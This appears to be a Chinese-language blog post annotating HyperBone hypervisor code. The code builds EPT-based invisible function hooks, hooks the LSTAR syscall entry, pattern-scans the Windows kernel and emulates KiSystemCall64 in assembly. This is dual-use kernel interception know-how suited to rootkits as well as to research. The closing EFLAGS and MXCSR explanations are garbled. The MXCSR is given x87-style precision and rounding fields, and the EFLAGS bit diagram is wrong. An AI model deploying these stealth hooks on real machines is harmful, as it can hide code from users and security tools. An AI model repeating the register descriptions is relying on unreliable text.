&lt;summary&gt;/// Hook function/// &lt;/summary&gt;/// &lt;param name=&quot;pFunc&quot;&gt;Function address&lt;/param&gt;/// &lt;param name=&quot;pHook&quot;&gt;Hook address&lt;/param&gt;/// /// &lt;param name=&quot;Type&quot;&gt;Hook type&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS PHHook( IN PVOID pFunc, IN PVOID pHook )&#123; PUCHAR CodePage = NULL; BOOLEAN Newpage = FALSE; PHYSICAL_ADDRESS phys = &#123; 0 &#125;; phys.QuadPart = MAXULONG64; // 检查EPT是否开启，权限是否为仅执行 if (!g_Data-&gt;Features.EPT || !g_Data-&gt;Features.ExecOnlyEPT) return STATUS_NOT_SUPPORTED; // 检查页面是否已经被钩子 PPAGE_HOOK_ENTRY pEntry = PHGetHookEntryByPage( pFunc, DATA_PAGE ); if (pEntry != NULL) &#123; // 已经有钩子，获取HookEntry中的CodePageVA CodePage = pEntry-&gt;CodePageVA; &#125; else &#123; // 没有钩子，分配一个连续页面 CodePage = MmAllocateContiguousMemory( PAGE_SIZE, phys ); Newpage = TRUE; &#125; if (CodePage == NULL) return STATUS_INSUFFICIENT_RESOURCES; // 分配PAGE_HOOK_ENTRY结构体内存 PPAGE_HOOK_ENTRY pHookEntry = ExAllocatePoolWithTag( NonPagedPool, sizeof( PAGE_HOOK_ENTRY ), HB_POOL_TAG ); if (pHookEntry == NULL) return STATUS_INSUFFICIENT_RESOURCES; RtlZeroMemory( pHookEntry, sizeof( PAGE_HOOK_ENTRY ) ); // 将原始函数代码拷贝到CodePage所指向的内存页 RtlCopyMemory( CodePage, PAGE_ALIGN( pFunc ), PAGE_SIZE ); // 将原始函数代码拷贝到PAGE_HOOK_ENTRY的OriginalData缓冲区，并记录复制的代码长度 NTSTATUS status = PHpCopyCode( pFunc, pHookEntry-&gt;OriginalData, &amp;pHookEntry-&gt;OriginalSize ); if (!NT_SUCCESS( status )) &#123; ExFreePoolWithTag( pHookEntry, HB_POOL_TAG ); return status; &#125; // 计算函数地址相对于页面的偏移 /* 掩码运算通过将一个页面大小减一的二进制数作为掩码，与待对齐地址进行位运算， 将指定位数之外的位都设置为0，从而达到向4kb对齐的目的。 */ ULONG_PTR page_offset = (ULONG_PTR)pFunc - (ULONG_PTR)PAGE_ALIGN( pFunc ); // 初始化JUMP_THUNK结构体，用于跳转到Hook函数 JUMP_THUNK thunk = &#123; 0 &#125;; PHpInitJumpThunk( &amp;thunk, (ULONG64)pHook ); memcpy( CodePage + page_offset, &amp;thunk, sizeof( thunk ) );// 将JUMP_THUNK结构体拷贝到CodePage的偏移处 pHookEntry-&gt;OriginalPtr = pFunc;// 原始函数地址 pHookEntry-&gt;DataPageVA = PAGE_ALIGN( pFunc );// 数据页面虚拟地址 /* 物理帧号是指在操作系统中用来管理物理内存的一种编号方式。 物理内存由一系列连续的物理页面（或称为物理帧）组成，每个物理页面的大小通常是固定的， 比如4KB或者更大的幂次方。 物理帧号是用来标识这些物理页面的唯一数字编号。它与物理内存地址相对应，可以用于将逻辑地址映射到物理地址。 操作系统通过维护一个数据结构（如页表、段表等）来管理和跟踪物理内存的使用情况。 这些数据结构中的条目使用物理帧号来标识每个物理页面的状态，如被使用、空闲、保留等。 通过使用物理帧号，操作系统可以实现内存分页机制、内存保护、虚拟内存管理等功能。 它使得操作系统能够有效地管理和控制物理内存资源，同时提供了对进程的内存访问控制和地址映射的支持。 */ pHookEntry-&gt;DataPagePFN = PFN( MmGetPhysicalAddress( pFunc ).QuadPart );// 数据页面物理帧号 pHookEntry-&gt;CodePageVA = CodePage;// 代码页面虚拟地址 pHookEntry-&gt;CodePagePFN = PFN( MmGetPhysicalAddress( CodePage ).QuadPart );// 代码页面物理帧号 // 检查全局链表是否为空，如果为空则初始化链表 if (g_PageList.Flink == NULL) InitializeListHead( &amp;g_PageList ); InsertTailList( &amp;g_PageList, &amp;pHookEntry-&gt;Link );// 将PAGE_HOOK_ENTRY结构体插入全局链表 // 新分配的页面 if (Newpage) &#123; // 创建HOOK_CONTEXT结构体，设置对应的值 HOOK_CONTEXT ctx = &#123; 0 &#125;; ctx.Hook = TRUE; ctx.DataPagePFN = pHookEntry-&gt;DataPagePFN; ctx.CodePagePFN = pHookEntry-&gt;CodePagePFN; // 执行PHpHookCallbackDPC回调创建EPT页面映射 KeGenericCallDpc( PHpHookCallbackDPC, &amp;ctx ); &#125; return STATUS_SUCCESS;&#125; 计算物理帧123456/*这里的PFN是一个宏函数，接受一个地址作为参数，使用位移操作符&gt;&gt;将地址右移PAGE_SHIFT位，并将结果强制转换为ULONG64类型，作为物理帧号返回。PAGE_SHIFT是一个常量或宏，表示页面大小与页内偏移之间的位移量。通常，页面大小是2的幂次方，例如4KB页面大小对应的PAGE_SHIFT值为12，即右移12位。位移操作实际上是对地址进行除法运算，将高位的部分消除，得到一个较小的数值，该数值就是物理帧号。*/#define PFN(addr) (ULONG64)((addr) &gt;&gt; PAGE_SHIFT) 获取页面函数钩子信息123456789101112131415161718192021222324/// &lt;summary&gt;/// Get hook data by page address/// &lt;/summary&gt;/// &lt;param name=&quot;ptr&quot;&gt;Function pointer&lt;/param&gt;/// &lt;param name=&quot;Type&quot;&gt;Page type&lt;/param&gt;/// &lt;returns&gt;Found hook entry or NULL&lt;/returns&gt;PPAGE_HOOK_ENTRY PHGetHookEntryByPage( IN PVOID ptr, IN PAGE_TYPE Type )&#123; if (g_PageList.Flink == NULL || IsListEmpty( &amp;g_PageList )) return NULL; PVOID page = PAGE_ALIGN( ptr );// 确保页面对齐 // 遍历g_PageList查找匹配的PAGE_HOOK_ENTRY结构体 for (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink) &#123; // 将节点转换为PAGE_HOOK_ENTRY结构体初始位置 PPAGE_HOOK_ENTRY pEntry = CONTAINING_RECORD( pListEntry, PAGE_HOOK_ENTRY, Link ); // 判断钩子的页面类型、数据是否匹配 if ((Type == DATA_PAGE &amp;&amp; pEntry-&gt;DataPageVA == page) || (Type == CODE_PAGE &amp;&amp; pEntry-&gt;CodePageVA == page)) return pEntry; &#125; return NULL;&#125; 计算给定成员的结构体初始位置123456789101112/*接受三个参数：address是指向某个成员的指针，type是结构体类型，field是结构体中的成员名。宏定义使用了一些指针运算和转换来计算结构体的起始地址。首先，将address强制转换为PCHAR类型（字符指针），然后通过减去(&amp;((type *)0)-&gt;field)的结果，得到结构体中成员field相对于结构体起始地址的偏移量（以字节计）。接下来，将该偏移量加到address的地址上，得到结构体的起始地址，并将其强制转换为目标的type类型指针，最终返回该指针作为结果。这个宏定义可以用于在已知结构体的某个成员地址的情况下，快速地获取整个结构体的起始地址。这种技巧在处理数据结构时非常有用。*/#define CONTAINING_RECORD(address, type, field) ((type *)( \\ (PCHAR)(address) - \\ (ULONG_PTR)(&amp;((type *)0)-&gt;field))) 通过LDASM工具将原始字节复制到指定的缓冲区中12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/// &lt;summary&gt;/// Copy original bytes using LDASM/// &lt;/summary&gt;/// &lt;param name=&quot;pFunc&quot;&gt;Original function ptr&lt;/param&gt;/// &lt;param name=&quot;OriginalStore&quot;&gt;Buffer to store bytes&lt;/param&gt;/// &lt;param name=&quot;pSize&quot;&gt;Lenght of copied data&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS PHpCopyCode( IN PVOID pFunc, OUT PUCHAR OriginalStore, OUT PULONG pSize )&#123; /* LDASM是一个函数解析工具，用于解析x86和x64指令的长度和操作码。它可以读取给定地址上的指令， 并提供有关指令的详细信息，例如指令长度、操作码、操作数等。 通过使用LDASM，开发人员可以分析和处理二进制代码，包括动态修改和重写函数的字节码。 它是基于汇编和机器码规范的解析库，它能够准确地分析各种指令，并提供相关信息以供后续处理。 */ // 追踪已复制的总字节数 PUCHAR src = pFunc;// 指向原始函数地址 PUCHAR old = OriginalStore;// 指向目标地址OriginalStore缓冲区 ULONG all_len = 0;// 已复制的总字节数 ldasm_data ld = &#123; 0 &#125;;// ldasm_data结构体，用于存储指令信息 do &#123; ULONG len = ldasm( src, &amp;ld, TRUE );// 解析指令，返回指令长度 // Determine code end if (ld.flags &amp; F_INVALID || (len == 1 &amp;&amp; (src[ld.opcd_offset] == 0xCC || src[ld.opcd_offset] == 0xC3)) || (len == 3 &amp;&amp; src[ld.opcd_offset] == 0xC2) || len + all_len &gt; 128) &#123; // 解析失败或者指令长度超过128字节或者指令为单字节返回(0xcc\\0xc3)、3字节返回(0xc2),RET、RETN、RETF break; &#125; // 将原始函数代码拷贝到OriginalStore缓冲区 memcpy( old, src, len ); // 如果指令中有相对偏移，需要修复 if (ld.flags &amp; F_RELATIVE) &#123; LONG diff = 0; const uintptr_t ofst = (ld.disp_offset != 0 ? ld.disp_offset : ld.imm_offset); const uintptr_t sz = ld.disp_size != 0 ? ld.disp_size : ld.imm_size; memcpy( &amp;diff, src + ofst, sz ); // 检查跳转目标地址是否超过了2GB的范围。如果跳转目标地址大于2GB，则跳转会导致整数溢出和错误的行为。 if (_abs64( src + len + diff - old ) &gt; INT_MAX) &#123; break; &#125; else &#123; diff += (LONG)(src - old); memcpy( old + ofst, &amp;diff, sz ); &#125; &#125; src += len; old += len; all_len += len; &#125; while (all_len &lt; sizeof( JUMP_THUNK )); // 检查是否成功复制了JUMP_THUNK结构体 if (all_len &lt; sizeof( JUMP_THUNK )) &#123; return STATUS_UNSUCCESSFUL; &#125; else &#123; // 初始化JUMP_THUNK结构体，用于跳转到Hook函数 PHpInitJumpThunk( (PJUMP_THUNK)old, (ULONG64)src ); *pSize = all_len; &#125; return STATUS_SUCCESS;&#125; LDASM 返回指令长度123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171unsigned int __fastcall ldasm( void *code, ldasm_data *ld, ULONG is64 )/* Description: Disassemble one instruction Arguments: code - pointer to the code for disassemble ld - pointer to structure ldasm_data is64 - set this flag for 64-bit code, and clear for 32-bit Return: length of instruction */&#123; UCHAR *p = (UCHAR*)code; UCHAR s, op, f; UCHAR rexw, pr_66, pr_67; s = rexw = pr_66 = pr_67 = 0; /* dummy check */ if (!code || !ld) return 0; /* init output data */ memset( ld, 0, sizeof( ldasm_data ) ); /* phase 1: parse prefixies */ while (cflags( *p ) &amp; OP_PREFIX) &#123; if (*p == 0x66) pr_66 = 1; if (*p == 0x67) pr_67 = 1; p++; s++; ld-&gt;flags |= F_PREFIX; if (s == 15) &#123; ld-&gt;flags |= F_INVALID; return s; &#125; &#125; /* parse REX prefix */ if (is64 &amp;&amp; *p &gt;&gt; 4 == 4) &#123; ld-&gt;rex = *p; rexw = (ld-&gt;rex &gt;&gt; 3) &amp; 1; ld-&gt;flags |= F_REX; p++; s++; &#125; /* can be only one REX prefix */ if (is64 &amp;&amp; *p &gt;&gt; 4 == 4) &#123; ld-&gt;flags |= F_INVALID; s++; return s; &#125; /* phase 2: parse opcode */ ld-&gt;opcd_offset = (UCHAR)(p - (UCHAR*)code); ld-&gt;opcd_size = 1; op = *p++; s++; /* is 2 byte opcode? */ if (op == 0x0F) &#123; op = *p++; s++; ld-&gt;opcd_size++; f = cflags_ex( op ); if (f &amp; OP_INVALID) &#123; ld-&gt;flags |= F_INVALID; return s; &#125; /* for SSE instructions */ if (f &amp; OP_EXTENDED) &#123; op = *p++; s++; ld-&gt;opcd_size++; &#125; &#125; else &#123; f = cflags( op ); /* pr_66 = pr_67 for opcodes A0-A3 */ if (op &gt;= 0xA0 &amp;&amp; op &lt;= 0xA3) pr_66 = pr_67; &#125; /* phase 3: parse ModR/M, SIB and DISP */ if (f &amp; OP_MODRM) &#123; UCHAR mod = (*p &gt;&gt; 6); UCHAR ro = (*p &amp; 0x38) &gt;&gt; 3; UCHAR rm = (*p &amp; 7); ld-&gt;modrm = *p++; s++; ld-&gt;flags |= F_MODRM; /* in F6,F7 opcodes immediate data present if R/O == 0 */ if (op == 0xF6 &amp;&amp; (ro == 0 || ro == 1)) f |= OP_DATA_I8; if (op == 0xF7 &amp;&amp; (ro == 0 || ro == 1)) f |= OP_DATA_I16_I32_I64; /* is SIB byte exist? */ if (mod != 3 &amp;&amp; rm == 4 &amp;&amp; !(!is64 &amp;&amp; pr_67)) &#123; ld-&gt;sib = *p++; s++; ld-&gt;flags |= F_SIB; /* if base == 5 and mod == 0 */ if ((ld-&gt;sib &amp; 7) == 5 &amp;&amp; mod == 0) &#123; ld-&gt;disp_size = 4; &#125; &#125; switch (mod) &#123; case 0: if (is64) &#123; if (rm == 5) &#123; ld-&gt;disp_size = 4; if (is64) ld-&gt;flags |= F_RELATIVE; &#125; &#125; else if (pr_67) &#123; if (rm == 6) ld-&gt;disp_size = 2; &#125; else &#123; if (rm == 5) ld-&gt;disp_size = 4; &#125; break; case 1: ld-&gt;disp_size = 1; break; case 2: if (is64) ld-&gt;disp_size = 4; else if (pr_67) ld-&gt;disp_size = 2; else ld-&gt;disp_size = 4; break; &#125; if (ld-&gt;disp_size) &#123; ld-&gt;disp_offset = (UCHAR)(p - (UCHAR *)code); p += ld-&gt;disp_size; s += ld-&gt;disp_size; ld-&gt;flags |= F_DISP; &#125; &#125; /* phase 4: parse immediate data */ if (rexw &amp;&amp; f &amp; OP_DATA_I16_I32_I64) ld-&gt;imm_size = 8; else if (f &amp; OP_DATA_I16_I32 || f &amp; OP_DATA_I16_I32_I64) ld-&gt;imm_size = 4 - (pr_66 &lt;&lt; 1); /* if exist, add OP_DATA_I16 and OP_DATA_I8 size */ ld-&gt;imm_size += f &amp; 3; if (ld-&gt;imm_size) &#123; s += ld-&gt;imm_size; ld-&gt;imm_offset = (UCHAR)(p - (UCHAR *)code); ld-&gt;flags |= F_IMM; if (f &amp; OP_RELATIVE) ld-&gt;flags |= F_RELATIVE; &#125; /* instruction is too long */ if (s &gt; 15) ld-&gt;flags |= F_INVALID; return s;&#125; 构造跳转指令字节码123456789101112131415/// &lt;summary&gt;/// Construct jump /// &lt;/summary&gt;/// &lt;param name=&quot;pThunk&quot;&gt;Data to initialize&lt;/param&gt;/// &lt;param name=&quot;To&quot;&gt;Address of jump&lt;/param&gt;VOID PHpInitJumpThunk( IN OUT PJUMP_THUNK pThunk, IN ULONG64 To )&#123; PULARGE_INTEGER liTo = (PULARGE_INTEGER)&amp;To;// 无符号64位整数 pThunk-&gt;PushOp = 0x68;// 推入32位立即数 pThunk-&gt;AddressLow = liTo-&gt;LowPart;// 低32位地址 pThunk-&gt;MovOp = 0x042444C7;// 将32位常数移动到指定内存 pThunk-&gt;AddressHigh = liTo-&gt;HighPart;// 高32位地址 pThunk-&gt;RetOp = 0xC3;// 返回指令&#125; 每个CPU页面钩子和解钩的回调函数123456789101112131415161718/// &lt;summary&gt;/// Per-CPU page hook/unhook routine/// &lt;/summary&gt;/// &lt;param name=&quot;Dpc&quot;&gt;Unused&lt;/param&gt;/// &lt;param name=&quot;Context&quot;&gt;Valid PHOOK_CONTEXT&lt;/param&gt;/// &lt;param name=&quot;SystemArgument1&quot;&gt;Unused&lt;/param&gt;/// &lt;param name=&quot;SystemArgument2&quot;&gt;Unused&lt;/param&gt;VOID PHpHookCallbackDPC( IN PRKDPC Dpc, IN PVOID Context, IN PVOID SystemArgument1, IN PVOID SystemArgument2 )&#123; UNREFERENCED_PARAMETER( Dpc ); PHOOK_CONTEXT pCTX = (PHOOK_CONTEXT)Context;// hook上下文 if (pCTX != NULL)// 进行hook或unhook __vmx_vmcall( pCTX-&gt;Hook ? HYPERCALL_HOOK_PAGE : HYPERCALL_UNHOOK_PAGE, pCTX-&gt;DataPagePFN, pCTX-&gt;CodePagePFN, 0 ); KeSignalCallDpcSynchronize( SystemArgument2 );// 发出同步信号 KeSignalCallDpcDone( SystemArgument1 );// 通知DPC执行完成&#125; 解除页面钩子12345678910111213141516171819202122232425262728293031323334353637383940414243/// &lt;summary&gt;/// Restore hooked function/// &lt;/summary&gt;/// &lt;param name=&quot;pFunc&quot;&gt;Function address&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS PHRestore( IN PVOID pFunc )&#123; // 不支持执行保护，无法恢复 if (!g_Data-&gt;Features.ExecOnlyEPT) return STATUS_NOT_SUPPORTED; // 获取要恢复函数的PAGE_HOOK_ENTRY结构体 PPAGE_HOOK_ENTRY pHookEntry = PHGetHookEntry( pFunc ); if (pHookEntry == NULL) return STATUS_NOT_FOUND; // 恢复原始字节，根据页面钩子数量 if (PHPageHookCount( pFunc, DATA_PAGE ) &gt; 1) &#123; // 存在其他CPU正在使用页面钩子，需要进行原子性的内存补丁操作 // 将原始的字节数据从钩子页中复制回原始函数所在的页面。这样可以确保其他CPU在执行期间的一致性。 ULONG_PTR page_offset = (ULONG_PTR)pFunc - (ULONG_PTR)PAGE_ALIGN( pFunc ); memcpy( (PUCHAR)pHookEntry-&gt;CodePageVA + page_offset, pHookEntry-&gt;OriginalData, pHookEntry-&gt;OriginalSize ); &#125; // 只被一个CPU钩子的函数，将钩子所在页面与原始函数所在的页面进行交换，以还原函数的内容 else &#123; HOOK_CONTEXT ctx = &#123; 0 &#125;;// 临时HOOK_CONTEXT结构体 ctx.Hook = FALSE; ctx.DataPagePFN = pHookEntry-&gt;DataPagePFN; ctx.CodePagePFN = pHookEntry-&gt;CodePagePFN;; // 使用Dpc回调Unhook模式 KeGenericCallDpc( PHpHookCallbackDPC, &amp;ctx ); &#125; // 释放钩子信息缓存 MmFreeContiguousMemory( pHookEntry-&gt;CodePageVA ); RemoveEntryList( &amp;pHookEntry-&gt;Link ); ExFreePoolWithTag( pHookEntry, HB_POOL_TAG ); return STATUS_SUCCESS;&#125; 计算当前函数有多少个hook1234567891011121314151617181920212223242526/// &lt;summary&gt;/// Get number of hooks in one page/// &lt;/summary&gt;/// &lt;param name=&quot;ptr&quot;&gt;Function address&lt;/param&gt;/// &lt;param name=&quot;Type&quot;&gt;Page type&lt;/param&gt;/// &lt;returns&gt;Number of hooks&lt;/returns&gt;ULONG PHPageHookCount( IN PVOID ptr, IN PAGE_TYPE Type )&#123; ULONG count = 0; // 检查是否为空 if (g_PageList.Flink == NULL || IsListEmpty( &amp;g_PageList )) return count; // 获取页面地址 PVOID page = PAGE_ALIGN( ptr ); // 遍历g_PageList查找匹配的PAGE_HOOK_ENTRY结构体 for (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink) &#123; PPAGE_HOOK_ENTRY pEntry = CONTAINING_RECORD( pListEntry, PAGE_HOOK_ENTRY, Link ); // 判断钩子的页面类型、数据是否匹配 if ((Type == DATA_PAGE &amp;&amp; pEntry-&gt;DataPageVA == page) || (Type == CODE_PAGE &amp;&amp; pEntry-&gt;CodePageVA == page)) count++; &#125; return count;&#125; 系统调用入口钩子1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/// &lt;summary&gt;/// Perform LSTAR hooking/// &lt;/summary&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS SHInitHook()&#123; /* LSTAR是一个MSR（Machine Specific Register），它保存了系统调用（system call）的入口地址， hooking LSTAR就可以实现对所有系统调用的监控和拦截。 */ NTSTATUS status = STATUS_SUCCESS; // 没有SSDT if (!UtilSSDTBase()) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: SSDT base not found\\n&quot;, CPU_IDX, __FUNCTION__ ); return STATUS_NOT_FOUND; &#125; // KiSystemServiceCopyEnd // 这个函数用于将系统调用的参数从用户空间复制到内核空间并调用具体的系统调用处理函数 // F7 05 ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? 0F 85 ? ? ? ? ? ? ? ? 41 FF D2 if (KiServiceCopyEndPtr == 0) &#123; // 搜索KiSystemServiceCopyEnd函数特征码找到地址 CHAR pattern[] = &quot;\\xF7\\x05\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\x0F\\x85\\xcc\\xcc\\xcc\\xcc\\x41\\xFF\\xD2&quot;; status = UtilScanSection( &quot;.text&quot;, (PCUCHAR)pattern, 0xCC, sizeof( pattern ) - 1, (PVOID)&amp;KiServiceCopyEndPtr ); if (!NT_SUCCESS( status )) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: KiSystemServiceCopyEnd not found\\n&quot;, CPU_IDX, __FUNCTION__ ); return status; &#125; &#125; // Hook LSTAR if (KiSystemCall64Ptr == 0) &#123; KiSystemCall64Ptr = __readmsr( MSR_LSTAR );// 原始LSTAR地址 // Something isn&#x27;t right if (KiSystemCall64Ptr == 0) return STATUS_UNSUCCESSFUL; // 在DPC回调中hook，修改LSTAR寄存器的值为SyscallEntryPoint定义的函数 KeGenericCallDpc( SHpHookCallbackDPC, (PVOID)(ULONG_PTR)SyscallEntryPoint ); return STATUS_SUCCESS; &#125; return STATUS_SUCCESS;&#125; 在内核PE文件的指定section中查找指定的pattern123456789101112131415161718192021222324252627282930313233343536/// &lt;summary&gt;/// Find pattern in kernel PE section/// &lt;/summary&gt;/// &lt;param name=&quot;section&quot;&gt;Section name&lt;/param&gt;/// &lt;param name=&quot;pattern&quot;&gt;Pattern data&lt;/param&gt;/// &lt;param name=&quot;wildcard&quot;&gt;Pattern wildcard symbol&lt;/param&gt;/// &lt;param name=&quot;len&quot;&gt;Pattern length&lt;/param&gt;/// &lt;param name=&quot;ppFound&quot;&gt;Found address&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS UtilScanSection( IN PCCHAR section, IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, OUT PVOID* ppFound )&#123; NT_ASSERT( ppFound != NULL ); if (ppFound == NULL) return STATUS_INVALID_PARAMETER; PVOID base = UtilKernelBase( NULL );// 获取NTOS内核的基址 if (!base) return STATUS_NOT_FOUND; PIMAGE_NT_HEADERS64 pHdr = RtlImageNtHeader( base );// 获取NTOS内核的PE头 if (!pHdr) return STATUS_INVALID_IMAGE_FORMAT; PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + 1);// 获取NTOS内核的第一个节表 // 遍历所有节表，进行模式匹配 for (PIMAGE_SECTION_HEADER pSection = pFirstSection; pSection &lt; pFirstSection + pHdr-&gt;FileHeader.NumberOfSections; pSection++) &#123; ANSI_STRING s1, s2; RtlInitAnsiString( &amp;s1, section ); RtlInitAnsiString( &amp;s2, (PCCHAR)pSection-&gt;Name ); if (RtlCompareString( &amp;s1, &amp;s2, TRUE ) == 0) return UtilSearchPattern( pattern, wildcard, len, (PUCHAR)base + pSection-&gt;VirtualAddress, pSection-&gt;Misc.VirtualSize, ppFound ); &#125; return STATUS_NOT_FOUND;&#125; LSTAR Hook 回调函数12345678910111213141516/// &lt;summary&gt;/// Per-CPU LSTAR hook/unhook routine/// &lt;/summary&gt;/// &lt;param name=&quot;Dpc&quot;&gt;Unused&lt;/param&gt;/// &lt;param name=&quot;Context&quot;&gt;New LASTAR value if hooking, 0 if unhooking&lt;/param&gt;/// &lt;param name=&quot;SystemArgument1&quot;&gt;Unused&lt;/param&gt;/// &lt;param name=&quot;SystemArgument2&quot;&gt;Unused&lt;/param&gt;VOID SHpHookCallbackDPC( PRKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2 )&#123; UNREFERENCED_PARAMETER( Dpc ); // 判断Context确定hook或unhook操作，进行VMCALL调用 __vmx_vmcall( Context != NULL ? HYPERCALL_HOOK_LSTAR : HYPERCALL_UNHOOK_LSTAR, (ULONG64)Context, 0, 0 ); KeSignalCallDpcSynchronize( SystemArgument2 );// 通知等待同步 KeSignalCallDpcDone( SystemArgument1 );// 通知DPC执行完成&#125; SyscallEntryPoint12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697EXTERN HookEnabled:DBEXTERN ArgTble:DBEXTERN HookTable:DQEXTERN KiSystemCall64Ptr:DQEXTERN KiServiceCopyEndPtr:DQUSERMD_STACK_GS = 10hKERNEL_STACK_GS = 1A8hMAX_SYSCALL_INDEX = 1000h.CODE; *********************************************************;; Determine if the specific syscall should be hooked;; if (SyscallHookEnabled[EAX &amp; 0xFFF] == TRUE); jmp KiSystemCall64_Emulate; else (fall-through); jmp KiSystemCall64;; *********************************************************SyscallEntryPoint PROC ;cli ; Disable interrupts swapgs ; 将GS寄存器切换为内核PCR mov gs:[USERMD_STACK_GS], rsp ; 将当前用户栈保存，以便调用返回时恢复 cmp rax, MAX_SYSCALL_INDEX ; 检查rax寄存器的值是否大于系统调用数组的大小 jge KiSystemCall64 ; 大于，表示该调用不存在，跳转到KiSystemCall64 lea rsp, offset HookEnabled ; 检查Hook是否被启用 cmp byte ptr [rsp + rax], 0 ; 检查Hook是否被启用 jne KiSystemCall64_Emulate ; 跳转进行KiSystemCall64_Emulate，否则进行KiSystemCall64SyscallEntryPoint ENDP; *********************************************************;; 返回到原始NTOSKRNL系统调用处理程序; (Restore all old registers first);; *********************************************************KiSystemCall64 PROC mov rsp, gs:[USERMD_STACK_GS] ; 取出用户模式RSP加载到RSP，切换到用户模式栈 swapgs ; 切换到用户模式GS寄存器，恢复原先寄存器 jmp [KiSystemCall64Ptr] ; 跳转到KiSystemCall64Ptr所指向的地址，64位指针KiSystemCall64 ENDP; *********************************************************;; 在SYSCALL之后直接执行的例程; (See: MSR_LSTAR);; *********************************************************KiSystemCall64_Emulate PROC ; NOTE: ; First 2 lines are included in SyscallEntryPoint mov rsp, gs:[KERNEL_STACK_GS] ; 加载内核模式RSP push 2Bh ; push 虚拟的SS选择子 push qword ptr gs:[10h] ; push 用户模式栈指针 push r11 ; push 先前的 EFLAGS push 33h ; push 虚拟 64位 CS 选择子 push rcx ; push 返回地址 mov rcx, r10 ; 在rcx中保存第一个参数 sub rsp, 8h ; 分配8字节作为虚拟错误码 push rbp ; 保存标准寄存器的值 sub rsp, 158h ; 分配一个固定大小的框架 lea rbp, [rsp+80h] ; 设置RBP为当前帧的基地址 mov [rbp+0C0h], rbx ; 保存一些非易失性的寄存器的值 mov [rbp+0C8h], rdi ; mov [rbp+0D0h], rsi ; mov byte ptr [rbp-55h], 2h ; 标志位，表示服务活动 mov rbx, gs:[188h] ; 获取当前线程地址 prefetchw byte ptr [rbx+90h] ; 对线程地址进行预取操作 stmxcsr dword ptr [rbp-54h] ; 保存当前MXCSR ldmxcsr dword ptr gs:[180h] ; 设置默认MXCSR cmp byte ptr [rbx+3], 0 ; 检查调试是否启用 mov word ptr [rbp+80h], 0 ; 如果调试未启用 jz KiSS05 ; 跳转到KiSS05标签处 mov [rbp-50h], rax ; 保存服务参数寄存器 mov [rbp-48h], rcx ; mov [rbp-40h], rdx ; mov [rbp-38h], r8 ; mov [rbp-30h], r9 ; int 3 ; 触发一个中断 align 10h KiSS05: ;sti ; 启动中断 mov [rbx+88h], rcx mov [rbx+80h], eaxKiSystemCall64_Emulate ENDP EFLAGSEFLAGS是x86架构中特有的寄存器，用于存储和控制处理器的状态标志位（flags）。它记录了CPU执行指令过程中产生的各种状态信息。 EFLAGS寄存器的位布局如下： 12345631 23 15 7 0┌───────┬───────────┬───────────┬────┐| | | | || RFU | VM, VIP | ID, VIP | AC || | | | |└───────┴───────────┴───────────┴────┘ 各个标志位的含义如下： AC (Alignment Check)：对齐检查标志位，用于检测内存操作的对齐情况。 ID (ID Flag)：识别标志位，用于表示CPU是否支持CPUID指令。 VIP (Virtual Interrupt Pending)：虚拟中断挂起标志位，在虚拟8086模式下使用。 VIF (Virtual Interrupt Flag)：虚拟中断标志位，在虚拟8086模式下使用。 OF (Overflow Flag)：溢出标志位，用于检测有符号整数运算结果是否溢出。 DF (Direction Flag)：方向标志位，用于控制字符串操作指令的方向。 IF (Interrupt Flag)：中断标志位，用于控制CPU是否响应外部中断。 TF (Trap Flag)：陷阱标志位，用于控制CPU是否进入单步执行模式。 SF (Sign Flag)：符号标志位，用于表示有符号整数运算结果的符号。 ZF (Zero Flag)：零标志位，用于表示算术或逻辑运算结果是否为零。 AF (Auxiliary Carry Flag)：辅助进位标志位，用于检测无符号整数运算时的进位情况。 PF (Parity Flag)：奇偶标志位，用于表示运算结果的低8位中1的个数的奇偶性。 CF (Carry Flag)：进位标志位，用于检测无符号整数运算结果是否产生进位。 这些标志位的状态可以通过指令读取或修改，用于判断和控制程序的执行流程。例如，通过检查ZF标志位可以判断某个运算结果是否为零，从而进行条件分支或循环的控制。 MXCSRMXCSR是x86架构中的一种控制寄存器，全称为”Floating-Point Control and Status Register”，它用于管理和控制浮点运算的行为和状态。 MXCSR寄存器是一个32位的寄存器，其位布局如下： 1234Copy Code31 15 7 0┌─────────┬───────┬───────┬─────┐│ RFU │ RC │ PC │ PM │└─────────┴───────┴───────┴─────┘ 各个标志位的含义如下： PM (Precision Mask)：精度掩码位，用于控制浮点运算结果的舍入精度。 PC (Precision Control)：精度控制位，用于设置浮点运算结果的默认舍入精度模式。 RC (Rounding Control)：舍入控制位，用于设置浮点运算结果的舍入方式。 RFU (Reserved for Future Use)：保留字段，暂未使用。 通过对MXCSR寄存器的设置，可以控制浮点运算的舍入方式、精度和异常处理等行为。例如，可以设置精度掩码位PM来屏蔽或允许特定类型的浮点异常，或者通过设置精度控制位PC来指定浮点运算结果的默认舍入精度模式。 MXCSR寄存器可以通过指令进行读取和修改，例如LDMXCSR和STMXCSR指令。它对于进行精确的浮点计算和处理浮点异常非常重要，能够提供更好的浮点运算控制和性能优化。 